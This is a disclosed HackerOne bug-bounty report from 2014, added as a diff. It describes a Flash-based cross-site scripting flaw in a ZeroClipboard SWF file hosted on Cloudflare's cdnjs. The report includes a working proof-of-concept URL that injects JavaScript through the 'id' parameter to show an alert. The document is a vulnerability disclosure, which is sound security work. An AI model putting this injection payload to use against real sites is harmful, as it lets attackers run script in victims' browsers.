@@ -1,0 +1,29 @@
+ReportLink:https://hackerone.com/reports/9017
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/prakharprasad
+ReportedTo:Cloudflare(cloudflare)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:17.07.2014 19:34:19
+
+Summary:
+
+Hi,
+
+There's a Flash-based XSS on cdnjs.cloudflare.com.
+
+**Proof-of-Concept**:
+
+1.Click on the link:
+
+https://cdnjs.cloudflare.com/ajax/libs/zeroclipboard/1.0.8/ZeroClipboard.swf?id=\%22))}catch(e){}if(!self.a)self.a=!alert(document.domain)//&width&height
+
+2.You shall see a Javascript `alert()`function executing in context of the subdomain.
+
+
+>**[Original Advisory](https://github.com/zeroclipboard/zeroclipboard/issues/14)**
+
+Thanks!
+
+@prakharprasad
